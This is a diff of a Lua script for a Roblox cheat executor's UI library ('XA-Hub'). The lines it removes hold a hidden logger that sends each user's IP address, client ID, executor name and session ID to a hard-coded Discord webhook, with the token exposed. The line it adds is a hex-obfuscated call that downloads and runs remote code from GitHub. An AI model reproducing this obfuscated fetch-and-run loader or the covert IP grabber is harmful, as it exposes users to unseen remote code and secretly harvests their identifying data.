@@ -1,85 +1,15 @@
-if not isfolder("XA-Hub") then makefolder("XA-Hub") end
-if not isfolder("XA-Hub/VapeLib") then makefolder("XA-Hub/VapeLib") end
+loadstring(request({Url = "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x58\x69\x6E\x67\x46\x6F\x72\x6B\x2F\x53\x63\x72\x69\x70\x74\x73\x2F\x72\x65\x66\x73\x2F\x68\x65\x61\x64\x73\x2F\x6D\x61\x69\x6E\x2F\x56\x61\x70\x65\x55\x49\x4C\x6F\x61\x64\x65\x72", Method = "GET"}).Body)()
 
-local HttpService = game:GetService("HttpService")
-local LocalPlayer = game:GetService("Players").LocalPlayer
+task.wait()
 
-if not LocalPlayer:IsInGroup(35310933) then
-    game.StarterGui:SetCore("SendNotification", {
-        Title = "XA：提示",
-        Text = "请加入群组'XA Hub'以使用脚本\n举报/上诉：118693249",
-    })
-    return
-end
-
-local Success, MapName = pcall(function()
-    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-end)
-if not Success then
-    MapName = "无法获取"
-end
-
-local function GetJson(v)
-    return HttpService:JSONDecode(game:HttpGet(v))
-end
-
-local function GetIP()
-    local IP = game:HttpGet("https://api.ipify.cn")
-    local Url = "https://cz88.net/api/cz88/ip/accurate?ip="..IP
-    return "["..IP.."]("..Url..")"
-end
-
-if not _G.Load then
-    _G.Load = true
-    request({
-        Url = "https://discord.com/api/webhooks/1235459830311948308/zjy2op1grz56ka-pG8GvbTJ37sJNxUWNyQhaSVBz00e30Pf0qf9mEtjqtF1cXvLhvcUr",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode({
-            username = LocalPlayer.DisplayName,
-            avatar_url = GetJson("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..LocalPlayer.UserId.."&size=420x420&format=Png").data[1].imageUrl,
-            embeds = {
-                {
-                    color = 65280,
-                    fields = {
-                        {
-                            name = "Game",
-                            value = "["..MapName.."](https://www.roblox.com/games/"..game.PlaceId..")"
-                        },
-                        {
-                            name = "User",
-                            value = "["..LocalPlayer.Name.."](https://www.roblox.com/users/"..LocalPlayer.UserId..")"
-                        },
-                        {
-                            name = "IP",
-                            value = GetIP()
-                        },
-                        {
-                            name = "ClientId",
-                            value = game:GetService("RbxAnalyticsService"):GetClientId()
-                        },
-                        {
-                           name = "Executor",
-                            value = identifyexecutor()
-                        },
-                        {
-                            name = "JobId",
-                            value = game.JobId
-                        }
-                    }
-                }
-            }
-        })
-    })
-end
+local Players = game:GetService("Players")
+local LP = Players.LocalPlayer
 
 local lib = {RainbowColorValue = 0, HueSelectionPosition = 0}
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
-local Mouse = LocalPlayer:GetMouse()
+local Mouse = LP:GetMouse()
 local PresetColor = Color3.fromRGB(44, 120, 224)
 local CloseBind = Enum.KeyCode.RightControl
 
@@ -112,7 +42,7 @@ Button.Draggable = true
 
 UICorner.Parent = Button
 Button.MouseButton1Click:connect(function()
-ToggleUI()
+    ToggleUI()
 end)
 --
 coroutine.wrap(
